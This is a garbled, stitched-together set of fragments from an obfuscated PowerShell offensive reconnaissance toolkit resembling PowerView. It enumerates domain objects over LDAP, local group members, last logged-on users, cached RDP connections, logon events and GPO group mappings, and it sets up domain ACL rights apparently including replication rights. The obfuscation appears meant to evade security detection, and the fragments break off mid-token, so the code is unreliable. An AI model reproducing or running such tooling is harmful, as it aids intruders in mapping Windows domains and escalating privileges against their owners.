                                        &(Z3b{0}{4}{3}{2}{1}Z3b-fS5zWritS5z,S5zboseS5z,S5zVerS5z,S5z-S5z,S5zeS5z) (S5z[!S5z+S5z] S5z+S5zNoS5z+S5z S5z+S5zaccS5z+S5zessS5z+S5z S5z+S5ztS5z+S5zo S5z+Z3bYoVPathZ3b)
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (YoV{shAIJKRE} in YoV{SIJKeIJKArCIJKHsHArES}) {
                    &(Z3b{2}{1}{3}{0}Z3b-f S5zseS5z,S5zeS5z,S5zWritS5z,S5z-VerboS5z) (S5zSS5z+S5zearcS5z+S5zhing S5z+S5zshaS5z+S5zre:S5z+S5z S5z+Z3bYoVShareZ3b)
                    YoV{SIJKEIJKARCHarGs} = @{
                        (Z3b{1}{0}Z3b-f S5zhS5z,S5zPatS5z) = YoV{SHIJKAre}
                        (Z3b{2}{0}{1}Z3b-f S5zcS5z,S5zludeS5z,S5zInS5z) = YoV{iNCIJKLuIJKdE}
                    }
                    if (YoV{OFFIJKiCeDIJKOCs}) {
                        YoV{sEArIJKcHaRIJKgs}[(Z3b{3}{0}{2}{1}Z3b -fS5zfS5z,S5zocsS5z,S5ziceDS5z,S5zOfS5z)] = YoV{oIJKFFIIJKcIJKeDoCS}
                    }
                    if (YoV{FReIJKSHIJKeXEs}) {
                        YoV{sEAIJKRIJKcHArgS}[(Z3b{0}{1}{2}Z3b -f S5zFreS5z,S5zshEXES5z,S5zsS5z)] = YoV{fReIJKSHEIJKXEs}
                    }
                    if (YoV{laStAIJKCCeIJKSstiIJKME}) {
                        YoV{sEIJKARChAIJKRIJKgs}[(Z3b{1}{4}{3}{2}{0}Z3b -f S5zssTimeS5z,S5zLasS5z,S5zeS5z,S5zAccS5z,S5ztS5z)] = YoV{lAIJKsTAcceSSIJKTIme}
                    }
                    if (YoV{lIJKAsTWrIJKITIJKEtime}) {
                        YoV{SeARcIJKHIJKARIJKgS}[(Z3b{2}{3}{0}{1}Z3b-fS5zTS5z,S5zimeS5z,S5zLastWrS5z,S5ziteS5z)] = YoV{LIJKAStwRiIJKTIJKEtIME}
                    }
                    if (YoV{cIJKReatIJKIOIJ','  YoV{SerIJKVIJKeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cREIJKdIJKEnTIJKiAL} =   YoV{jIJKFI}::Z3beMIJKpTYZ3b
    )

    BEGIN {
        YoV{naMETYIJKPIJKeS} = @{
            S5zDNS5z                =   1  
            (Z3b{0}{1}{2}Z3b -f S5zCS5z,S5zanoniS5z,S5zcalS5z)         =   2  
            S5zNT4S5z               =   3  
            (Z3b{2}{0}{1}Z3b-f S5zisplS5z,S5zayS5z,S5zDS5z)           =   4  
            (Z3b{0}{2}{1}Z3b -','        [Switch]
        YoV{USerIJKAIJKdMiNCOUIJKNT},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}{4}{3}Z3b-fS5zDomainCoS5z,S5znS5z,S5ztrS5z,S5zerS5z,S5zollS5z})]
        [String]
        YoV{sErIJKVIJKer},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zBasS5z,S5zeS5z}, {Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zOneLevS5z,S5zlS5z}, {Z3b{0}{1}Z3b-f S5zSubS5z,S5ztreeS5z})]
        [String]
        YoV{sIJKEIJKArcIJKHscopE} = (Z3b{0}{1}Z3b-f S5zSubtreS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKEsuIJKlTPaGeSIJKiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKEIJKRIJKVErTIMElIJKiMiT},

        [Switch]
        YoV{tOMbSIJKTOIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
  ','tIJKiIJKAL} =  (  &(Z3b{0}{2}{1}Z3b-fS5zGeS5z,S5zLdITEMS5z,S5zt-ChIS5z) VarIabLe:jfi  ).Z3bVIJKAlueZ3b::Z3beMPIJKTyZ3b,

        [Switch]
        YoV{rIJKAW}
    )

    BEGIN {
        YoV{sIJKearIJKCheIJKRaIJKRGIJKUMeNts} = @{}
        if (YoV{PIJKSBOIJKUnDPARIJKAIJKmIJKEtErs}[(Z3b{1}{0}Z3b -fS5zmainS5z,S5zDoS5z)]) { YoV{SEIJKArIJKChE','erarIJKGUIJKmeIJKNTs}[(Z3b{1}{2}{0}Z3b-fS5ziesS5z,S5zPrS5z,S5zopertS5z)] = YoV{PIJKROPIJKeRIJKTIES} }
        if (YoV{PSBoUIJKNdIJKPaRaMIJKetIJKeRS}[(Z3b{1}{0}{2}Z3b-fS5zrS5z,S5zSeaS5z,S5zchBaseS5z)]) { YoV{lIJKDAPSIJKEARchEraIJKRGUMENIJKTS}[(Z3b{3}{2}{0}{1}Z3b-fS5zchS5z,S5zBaseS5z,S5zearS5z,S5zSS5z)] = YoV{sIJKEaIJKRChIJKBASE} }
        if (YoV{PsboundIJKpAIJKRaMIJKeTErs}[(Z3b{1}{0}Z3b-f S5zverS5z,S5zSerS5z)]) { YoV{lIJKDAPIJKsIJKeaRCHeraIJKRIJKgUmENts}[(Z3b{1}{0}Z3b -f S5zrverS5z,S5zSeS5z)] = YoV{SIJKerIJKVER} }
        if (YoV{PIJKsIJKBOuNIJKDpAraIJKmeIJKTErS}[(Z3b{2}{1}{3}{0}Z3b-fS5zeS5z,S5zearchScoS5z,S5zSS5z,S5zpS5z)]) { YoV{lDaPSearCIJKHerIJKARGumEIJKNIJKTS}[(Z3b{3}{1}{0}{2}Z3b-fS5zarchScopS5z,S5zeS5z,S5zeS5z,S5zSS5z)] = YoV{SIJKEarIJKcHscOpe} }
        if (YoV{PsBOUIJKNIJKDpIJKArAMIJKEtErs}[(Z3b{1}{2}{4}{0}{3}Z3b -fS5zizS5z,S5zResultS5z,S5zPS5z,S5zeS5z,S5zageSS5z)]) { YoV{lDAPIJKSeIJKARchERIJKArGuIJKMIJKenTS}[(Z3b{2}{0}{1}{4}{3}Z3b -fS5zeS5z,S5zsultPageS5z,S5zRS5z,S5zizeS5z,S5zSS5z)] = YoV{ReSUIJKlIJKTPaIJKgesizE} }
        if (YoV{PsIJKBIJKOUNIJKdpaRaMEtERs}[(Z3b{0}{2}{3}{1}Z3b -fS5zServS5z,S5zmitS5z,S5zerS5z,S5zTimeLiS5z)]) { YoV{LDapsEaRcIJKHERIJKARguMEnIJKTs}[(Z3b{3}{0}{1}{2}Z3b -fS5zrTiS5z,S5zmeS5z,S5zLimitS5z,S5zServeS5z)] = YoV{SIJKErvIJKeIJKRTIMIJKeLiMit} }
        if (YoV{PsBOundIJKPAIJKRaMIJKeTEIJKRs}[(Z3b{1}{0}{2}Z3b -fS5ztonS5z,S5zTombsS5z,S5zeS5z)]) { YoV{LdaIJKpIJKseaRcIJKheRarIJKguMIJKenTs}[(Z3b{2}{1}{0}Z3b -f S5zeS5z,S5ztonS5z,S5zTombsS5z)] = YoV{TOMbSIJKTIJKONe} }
        if (YoV{pSIJKBouNdPArIJKAmeTIJKeIJKRs}[(Z3b{0}{2}{3}{1}Z3b -f S5zCS5z,S5zlS5z,S5zredentiS5z,S5zaS5z)]) { YoV{ldIJKAPSeaRIJKCIJKhERaIJKRGUMents}[(Z3b{1}{2}{0}Z3b -fS5zialS5','5z,S5zearchScoS5z)]) { YoV{dIJKOmaintRUsTIJKARIJKguIJKmEnTS}[(Z3b{2}{1}{3}{0}Z3b -fS5zeS5z,S5zearcS5z,S5zSS5z,S5zhScopS5z)] = YoV{sEArIJKchsCIJKOPe} }
    if (YoV{PSbOUndpAraIJKMEIJKTIJKErs}[(Z3b{0}{3}{2}{1}Z3b -fS5zRS5z,S5zeSizeS5z,S5zltPagS5z,S5zesuS5z)]) { YoV{dOMAINtrUsIJKTIJKARgumIJKEnIJKTS}[(Z3b{0}{1}{2}{3}Z3b-f S5zResulS5z,S5zt','5zhomedirS5z,S5ztoryS5z)])}if (YoV{UsIJKerreIJKsUIJKlt}.Z3bProPERIJKTIIJKEsZ3b[(Z3b{0}{2}{1}Z3b -f S5zsS5z,S5zptpathS5z,S5zcriS5z)]) {&(Z3b{2}{1}{0}Z3b -fS5zhS5z,S5zlit-PatS5z,S5zSpS5z)(YoV{USIJKEIJKRrESUlt}.Z3bPIJKRoPERIJKTIEsZ3b[(Z3b{1}{0}{3}{2}Z3b -fS5zpS5z,S5zscriS5z,S5zhS5z,S5ztpatS5z)])}if (YoV{useRrIJKEsIJKUIJKlt}.Z3bPrOIJKPEIJKRTIesZ3b[(Z3b{0}{3}{1}{2}Z3b -f S5zprofS5z,S5zlepatS5z,S5zhS5z,S5ziS5z)]) {&(Z3b{2}{1}{0}Z3b -fS5zhS5z,S5ztS5z,S5zSplit-PaS5z)(YoV{USEIJKRREIJKsIJKULT}.Z3bpROpERIJKTiIJKes','ateTime]
        YoV{stIJKAIJKRtIJKTImE} =  (  &(Z3b{3}{0}{1}{2}Z3b-f S5zvAS5z,S5zRIS5z,S5zabLES5z,S5zgEt-S5z) (S5z7S5z+S5zdvS5z+S5zCieS5z)  -VALuEonL  )::Z3bnIJKOwZ3b.(Z3b{1}{0}{2}Z3b-fS5zddDaS5z,S5zAS5z,S5zysS5z).Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        YoV{eNDtIIJKme} =  (  &(Z3b{2}{1}{0}{3}Z3b -f S5zT-varS5z,S5zES5z,S5zgS5z,S5zIablES5z) (S5z7dVcS5z+S5ziS5z+S5zeS5z)  -vaLUeONly  )::Z3bNIJKOwZ3b,

        [ValidateRange(1, 1000000)]
        [Int]
        YoV{maxIJKEveIJKNts} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cRIJKedEIJKNtIJKiAL} =  YoV{JIJKFI}::Z3bEmIJKPtyZ3b
    )

    BEGIN {
        
        YoV{XIJKPAThfiLtIJKeR} = ((S5zAiy
<QS5z+S5zueS5z+S5zrS5z+S5zyS5z+S5zList>S5z+S5z
 S5z).Z3brIJKEPIJKLaCEZ3b(([chaR]65+[chaR]105+[chaR]121),[sTring][chaR]34)+S5z S5z+S5z S5z+S5z S5z+S5z<QueS5z+S5zry S5z+(S5zId={0}0S5z+S5z{0} S5z) -f  [char]34+((S5zPath=S5z+S5zFXS5z+S5ztSecurS5z+S5zityFS5z+S5zXtS5z+S5z>S5z+S5z

 S5z)-crepLaCE  S5zFXtS5z,[CHar]34)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<!-S5z+S5z- S5z+S5zLS5z+S5zoS5z+S5zgon S5z+S5zevenS5z+S5zts S5z+S5z-S5z+S5z-S5z+S5z>
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z<SelecS5z+S5zt S5z+(S5zPath={0}S5z+S5zSecurity{S5z+S5z0S5z+S5z}>
S5z+S5z S5z)-F [cHaR]34+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z*[
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zSysS5z+S5ztS5z+S5zemS5z+S5z[
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zProvS5z+S5ziderS5z+S5z[
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z@S5z+S5zNaS5z+S5zmeS5z+S5z=IaS5z+S5z7S5z+S5zMicrosoS5z+S5zft-Windows-SecuriS5z+S5ztyS5z+S5z-AudS5z+S5zitiS5z+S5zngIaS5z+S5z7S5z+S5z
S5z+S5z S5z) -CReplaCE  ([CHar]73+[CHar]97+[CHar]55),[CHar]39)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zanS5z+S5zd S5z+S5z(LS5z+S5zevel=S5z+S5z4 S5z+S5zoS5z+S5zr S5z+S5zLeS5z+S5zvS5z+S5zel=0) S5z+S5zandS5z+S5z S5z+S5z(S5z+S5zEventID=4624)S5z+S5zS5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zaS5z+S5znd S5z+S5zTiS5z+S5zmeCreS5z+S5zatedS5z+S5z[
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z@SystS5z+S5zemS5z+S5zTime&gS5z+S5ztS5z+S5z;=S5z+S5zPS5z+S5z6zmS5z+S5zud(mudStartTimeS5z+S5z.ToUniversalTimeS5z+S5z().ToString(P6zsP6S5z+S5zz)S5z+S5z)P6z S5','JKgIJKROUpIJK_MembEIJKRIJKs_iNfO_2}::(Z3b{2}{0}{1}Z3b-fS5zeS5z,S5ztSizeS5z,S5zGS5z).Invoke()

                    
                    for (YoV{I} = 0; (YoV{i} -lt YoV{EIJKNtrIJKiesreIJKAD}); YoV{i}++) {
                        
                        YoV{nEWIJKiIJKNTPtr} = &(Z3b{2}{1}{0}Z3b -fS5zbjectS5z,S5z-OS5z,S5zNewS5z) (Z3b{0}{3}{2}{1}Z3b-f S5zSysS5z,S5ztrS5z,S5zntpS5z,S5ztem.IS5z) -ArgumentList YoV{OfIJKFIJKSEt}
                        YoV{iIJKNfO} = YoV{NIJKeWiNIJKTptr} -as YoV{LoIJKcaLGRIJKOIJKUIJKp_MEMIJKBerIJKs_InfoIJK_2}

                        YoV{ofIJKFIJKseT} = YoV{NEIJKwIIJKNTPtR}.(Z3b{1}{2}{0}Z3b -f S5zt64S5z,S5zToIS5z,S5znS5z).Invoke()
                        YoV{oFFsIJKeT} += YoV{INcReMIJKEIJKNT}

                        YoV{sIJKiDsIJKTriNg} = S5zS5z
                        YoV{ReIJKsulIJKT2} = YoV{aDvAIJKpIJKIIJK32}::Z3bcoNIJKVERtSIJKidtostRIJKIIJKNGIJKSIDZ3b(YoV{InIJKFo}.Z3bLgIJKRMI2IJK_SidZ3b, [ref]YoV{SIdIJKSIJKTrIng});YoV{laStIJKEIJKRROr} =   (  &(Z3b{1}{3}{2}{0}Z3b-f S5zBlES5z,S5zgET-vS5z,S5zriaS5z,S5zAS5z) np6yr ).Z3bvIJKAlUeZ3b::(Z3b{0}{2}{3}{1}Z3b -fS5zGetLaS5z,S5zorS5z,S5zstWinS5z,S5z32ErrS5z).Invoke()

                        if (YoV{rIJKeSulIJKT2} -eq 0) {
                            &(Z3b{0}{1}{2}Z3b-f S5zWritS5z,S5ze-S5z,S5zVerboseS5z) Z3b[Get-NetLocalGroupMember] Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
                        }
                        else {
                            YoV{MIJKEmIJKBER} = &(Z3b{0}{1}{2}{3}Z3b-fS5zNew-S5z,S5zObS5z,S5zjS5z,S5zectS5z) (Z3b{0}{1}Z3b -f S5zPSObjeS5z,S5zctS5z)
                            YoV{MIJKeMIJKBer} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdS5z,S5zmberS5z,S5zd-MeS5z) (Z3b{0}{3}{1}{2}Z3b-fS5zNS5z,S5zertS5z,S5zyS5z,S5zotepropS5z) (Z3b{3}{2}{1}{0}Z3b -fS5zrNameS5z,S5zteS5z,S5zpuS5z,S5zComS5z) YoV{COIJKMpIJKUTer}
                            YoV{MEmBIJKEr} JGO &(Z3b{1}{2}{3}{0}Z3b -fS5zrS5z,S5zAddS5z,S5z-',',S5zNoteprS5z,S5ztS5z) (Z3b{3}{2}{1}{0}Z3b-fS5znS5z,S5zedOS5z,S5zoggS5z,S5zLastLS5z) YoV{LastIJKUSIJKEr}
                YoV{laStIJKlIJKoIJKGgEdIJKoN}.Z3bPsoIJKBIJKJECtZ3b.Z3bTYIJKPeNaIJKmesZ3b.(Z3b{0}{1}Z3b-f S5zInserS5z,S5ztS5z).Invoke(0, (Z3b{1}{2}{0}{3}{4}Z3b -f S5zwerView.LaS5z,S5zPS5z,S5zoS5z,S5zsS5z,S5ztLoggedOnUserS5z))
                YoV{LAStIJKloGIJKGeIJKdOn}
            }
            catch {
                &(Z3b{3}{2}{1}{0}Z3b -f S5zngS5z,S5zte-WarniS5z,S5zriS5z,S5zWS5z) (S5z[GS5z+S5zet-WS5z+S5zMS5z+S5zIRS5z+S5zegLastS5z+S5zLoggedOn]S5z+S5z S5z+S5zErS5z+S5zror S5z+S5zopeningS5z+S5z S5z+S5zrS5z+S5zemS5z+S5zote S5z+S5zregiS5z+S5zstS5z+S5zry S5z+S5zonS5z+S5z S5z+Z3bYoVComputer. Z3b+S5zRemS5z+S5zote S5z+S5zregiS5z+S5zstrS5z+S5zy S5z+S5zliS5z+S5zkely S5z+S5znoS5z+S5zt S5z+S5zeS5z+S5znS5z+S5zabled.S5z)
            }
        }
    }
}


function getIJK-wIJKmirEIJKGcAIJKcheDrDPcoNIJKNeIJKCTion {


    [OutputType({Z3b{2}{0}{4}{3}{1}Z3b-fS5zoweS5z,S5zedRDPConnectionS5z,S5zPS5z,S5zachS5z,S5zrView.CS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTiOn = 0, valuEFrOmpiPElInE = YoV{TIJKRUE}, valuEfroMpIPeLINEByPrOpERTynAmE = YoV{tRIJKUE})]
        [Alias({Z3b{1}{0}Z3b-f S5zNameS5z,S5zHostS5z}, {Z3b{1}{2}{0}Z3b-f S5zameS5z,S5zdnS5z,S5zshostnS5z}, {Z3b{1}{0}Z3b-f S5zmeS5z,S5znaS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cIJKOIJKmIJKPUTeRnaIJKmE} = (Z3b{1}{0}{2}Z3b-f S5zocalhS5z,S5zlS5z,S5zostS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crIJKEIJKDEIJKNTIAL} =  (  &(Z3b{2}{0}{1}Z3b-f S5zARS5z,S5ziaBLeS5z,S5zvS5z)  (S5zJS5z+S5zFiS5z) -vAl  )::Z3bEmIJKpTYZ3b
    )

    PROCESS {
        ForEach (YoV{COIJKmpIJKUteR} in YoV{cOmPutEIJKRIJKNIJKAmE}) {
            
            YoV{hIJKku} = 2147483651

            YoV{WMIIJKARIJKGIJKUmIJKeNTS} = @{
                (Z3b{0}{1}Z3b-f S5zLS5z,S5zistS5z) = YoV{tIJKRue}
                (Z3b{1}{0}Z3b-f S5zsS5z,S5zClasS5z) = (Z3b{0}{2}{1}Z3b-fS5zStdRS5z,S5zovS5z,S5zegPrS5z)
                (Z3b{2}{1}{0}Z3b -f S5zespaceS5z,S5zmS5z,S5zNaS5z) = (((Z3b{3}{1}{0}{2}Z3b-fS5ztXPS5z,S5zoS5z,S5z2defaultS5z,S5zroS5z)) -crEplace([ChAR]88+[ChAR]80+[ChAR]50),[ChAR]92)
                (Z3b{1}{3}{2}{0}Z3b-fS5zeS5z,S5zComS5z,S5znamS5z,S5zputerS5z) = YoV{CIJKOmPutEr}
                (Z3b{2}{0}{1}Z3b -f S5zrActS5z,S5zionS5z,S5zErroS5z) = (Z3b{0}{1}Z3b -f S5zStoS5z,S5zpS5z)
            }
            if (YoV{PSIJKBOUNDPAIJKRIJKAMEtERS}[(Z3b{0}{2}{1}Z3b-fS5zCredS5z,S5zalS5z,S5zentiS5z)]) { YoV{wmIIJKArIJKGUMIJKeIJKNts}[(Z3b{1}{0}{2}Z3b-f S5zreS5z,S5zCS5z,S5zdentialS5z)] = YoV{credENTIJKiIJKAL} }

            try {
                YoV{rIJKeg} = &(Z3b{1}{3}{2}{0}Z3b -fS5zectS5z,S5zGet-WmS5z,S5zObjS5z,S5ziS5z) @WmiArguments

                
                YoV{USEIJKRSIIJKds} = (YoV{rIJKeG}.(Z3b{1}{0}Z3b -fS5zeyS5z,S5zEnumKS5z).Invoke(YoV{hIJKkU}, S5zS5z)).Z3bsIJKNAMeSZ3b JGO &(Z3b{0}{2}{1}Z3b -f S5zWS5z,S5zctS5z,S5zhere-ObjeS5z) { YoV{_} -match (((S5zS-S5z+S5z1-S5z+S5z5S5z+S5z-2S5z+S5z1','}, mandatorY = YoV{TIJKRue})]
        [Alias({Z3b{3}{1}{0}{2}Z3b -f S5zNaS5z,S5zshedS5z,S5zmeS5z,S5zDistinguiS5z}, {Z3b{0}{2}{1}{3}Z3b-f S5zSamAS5z,S5zamS5z,S5zccountNS5z,S5zeS5z}, {Z3b{1}{0}Z3b-fS5zameS5z,S5zNS5z})]
        [String]
        YoV{pRInciIJKPIJKAlIdIJKENtIJKITy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{PrINcIJKIpaLIJKDIJKOmain},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{3}{1}Z3b -fS5zDS5z,S5ztrollerS5z,S5zomaiS5z,S5znConS5z})]
        [String]
        YoV{sERIJKVer},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBS5z,S5zaseS5z}, {Z3b{0}{1}{2}Z3b -f S5zOneLS5z,S5zevS5z,S5zelS5z}, {Z3b{1}{0}Z3b-fS5zubtreeS5z,S5zSS5z})]
        [String]
        YoV{searIJKCIJKHIJKscOPe} = (Z3b{0}{1}Z3b -f S5zSubtreS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{resUIJKLtPaGeIJKSIJKIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{seIJKRVERTIJKImIJKelIJKiMIT},

        [Switch]
        YoV{ToMbSTIJKOIJKNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREDEntIIJKAL} =  (  &(S5zLsS5z) VARIaBle:jfi ).Z3bvAIJKluEZ3b::Z3bempIJKTYZ3b,

        [Parameter(maNdatORy = YoV{TRIJKUe})]
        [ValidateSet({Z3b{2}{5}{0}{1}{4}{3}Z3b-f S5zeS5z,S5zssSysteS5z,S5zAS5z,S5zrityS5z,S5zmSecuS5z,S5zccS5z}, {Z3b{0}{3}{2}{1}Z3b -fS5zCreaS5z,S5zildS5z,S5zeChS5z,S5ztS5z},{Z3b{0}{1}Z3b-fS5zDelS5z,S5zeteS5z},{Z3b{0}{1}{3}{2}Z3b-f S5zDeletS5z,S5zeCS5z,S5zdS5z,S5zhilS5z},{Z3b{1}{0}{2}Z3b-fS5zteTreS5z,S5zDeleS5z,S5zeS5z},{Z3b{0}{1}{2}{3}Z3b -f S5zExS5z,S5zte','tS5z,S5zCS5z)(YoV{COnStRIJKUcTIJKor},
                YoV{dlIJKLNIJKAME}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(YoV{sIJKeTIJKlasIJKTeRrIJKOrIJKFiE','{0}{1}Z3b -fS5zOPaS5z,S5zthS5z,S5zGPS5z) YoV{TaRGETIJKgRIJKOUIJKpsXIJKMIJKlPath}
                    YoV{GROIJKUpsxIJKMl} JGO &(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5zMembeS5z,S5zAdd-S5z) (Z3b{1}{0}{2}Z3b -f S5zeproS5z,S5zNotS5z,S5zpertyS5z) (Z3b{0}{1}{2}Z3b-f S5zFilS5z,S5zteS5z,S5zrsS5z) YoV{FIJKiLTIJKeRS}
                    YoV{grIJKOUpSIJKXML} JGO &(Z3b{2}{3}{0}{1}Z3b-f S5zeS5z,S5zmberS5z,S5zAdS5z,S5zd-MS5z) (Z3b{0}{1}{2}Z3b-f S5zNoS5z,S5ztepropeS5z,S5zrtyS5z) (Z3b{2}{1}{0}Z3b-fS5zNameS5z,S5zroupS5z,S5zGS5z) YoV{GROuPnIJKAIJKmE}
                    YoV{grIJKOUPIJKSXmL} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdd-S5z,S5zemberS5z,S5zMS5z) (Z3b{2}{3}{0}{1}Z3b -f S5zrS5z,S5ztyS5z,S5zNoteproS5z,S5zpeS5z) (Z3b{0}{2}{1}Z3b-f S5zGrouS5z,S5zSIDS5z,S5zpS5z) YoV{grOuPIJKSIJKiD}
                    YoV{GrIJKoIJKUpsXMl} JGO &(Z3b{0}{1}{3}{2}Z3b-fS5zAdd-MeS5z,S5zmS5z,S5zerS5z,S5zbS5z) (Z3b{0}{3}{1}{2}Z3b -f S5zNotepS5z,S5zpS5z,S5zertyS5z,S5zroS5z) (Z3b{4}{0}{3}{2}{1}Z3b -f S5zupS5z,S5zfS5z,S5zOS5z,S5zMemberS5z,S5zGroS5z) YoV{nIJKUlL}
                    YoV{gIJKRoUPIJKSxMl} JGO &(Z3b{3}{2}{1}{0}Z3b -f S5zrS5z,S5zmbeS5z,S5z-MeS5z,S5zAddS5z) (Z3b{0}{2}{1}{3}Z3b -f S5zNoteproS5z,S5zrS5z,S5zpeS5z,S5ztyS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zGS5z,S5zupMembS5z,S5zersS5z,S5zroS5z) YoV{mIJKemBIJKeRS}
                    YoV{grIJKoUPIJKsxml}.Z3bPsIJKoBjEcTZ3b.Z3bTYPENaIJKmesZ3b.(Z3b{1}{0}Z3b -f S5ztS5z,S5zInserS5z).Invoke(0, (Z3b{3}{2}{1}{','oV{iIJKsGIJKRoUP} = @((Z3b{2}{1}{0}Z3b -fS5z35456S5z,S5z4S5z,S5z268S5z),(Z3b{1}{2}{0}{3}Z3b -fS5z435S5z,S5z2S5z,S5z68S5z,S5z457S5z),(Z3b{1}{0}{2}Z3b -f S5z709S5z,S5z5368S5z,S5z12S5z),(Z3b{2}{1}{0}Z3b-f S5z3S5z,S5z687091S5z,S5z53S5z)) -contains YoV{oBIJKJIJKECT}.Z3bsAIJKMIJKAcIJKCounIJKTtYPEZ3b

                        YoV{gpoLoIJKcaLgrIJKOIJKUPMAIJKppinG} = &(Z3b{0}{1}{2}Z3b-f S5zNewS5z,S5z-S5z,S5zObjectS5z) (Z3b{0}{2}{1}Z3b-fS5zPSObjeS5z,S5ztS5z,S5zcS5z)
                        YoV{gPoIJKLOIJKCaIJKLGROUPmApIJKPing} JGO &(Z3b{0}{2}{1}Z3b -fS5zAddS5z,S5zberS5z,S5z-MemS5z) (Z3b{3}{1}{2}{0}Z3b-f S5ztyS5z,S5zroS5z,S5zperS5z,S5zNotepS5z) (Z3b{0}{1}{2}Z3b -f S5zObjeS5z,S5zcS5z,S5ztNameS5z) YoV{OBjIJKEcT}.Z3bsIJKAIJKmAcCountNAMEZ3b
   ','S5zQuS5z+S5zerS5z+S5zyS5z+S5z>
</S5z+S5zQueryLiS5z+S5zsS5z+S5zt>
{0S5z+S5z}S5z)-F[CHAr]34)
        YoV{EVENIJKTIJKAIJKRgumENIJKTs} = @{
            (Z3b{1}{2}{0}{3}Z3b -f S5zPS5z,S5zFS5z,S5zilterXS5z,S5zathS5z) = YoV{xIJKpatHfiIJKlTer}
            (Z3b{1}{2}{0}Z3b -f S5zmeS5z,S5zLogS5z,S5zNaS5z) = (Z3b{0}{2}{1}Z3b -f S5zSS5z,S5ztyS5z,S5zecuriS5z)
            (Z3b{2}{0}{1}Z3b-f S5zxES5z,S5zventsS5z,S5zMaS5z) = YoV{mIJKAIJKXeVeIJKNTS}
        }
        if (YoV{pSBIJKOIJKUnIJKdPARaIJKmIJKETErS}[(Z3b{1}{2}{0}Z3b-f S5zalS5z,S5zCredentS5z,S5ziS5z)]) { YoV{eVeNTArIJKGumIJKENTS}[(Z3b{1}{3}{2}{0}Z3b -fS5zalS5z,S5zCS5z,S5zntiS5z,S5zredeS5z)] = YoV{crIJKEDeIJKNtiaL} }
    }

    PROCESS {
        ForEach (YoV{cIJKomPUteR} in YoV{COMPutIJKErNIJKAIJKME}) {

            YoV{EIJKVEntAIJKRgUmeIJKNTS}[(Z3b{2}{0}{3}{1}Z3b -fS5zomputeS5z,S5zmeS5z,S5zCS5z,S5zrNaS5z)] = YoV{cOMIJKpIJKUteR}

            &(Z3b{1}{2}{0}Z3b -fS5zinEventS5z,S5zGetS5z,S5z-WS5z) @EventArgumentsJGO &(Z3b{4}{3}{1}{0}{2}Z3b-f S5zObjS5z,S5zh-S5z,S5zectS5z,S5zrEacS5z,S5zFoS5z) {
                YoV{eVIJKEIJKNt} = YoV{_}
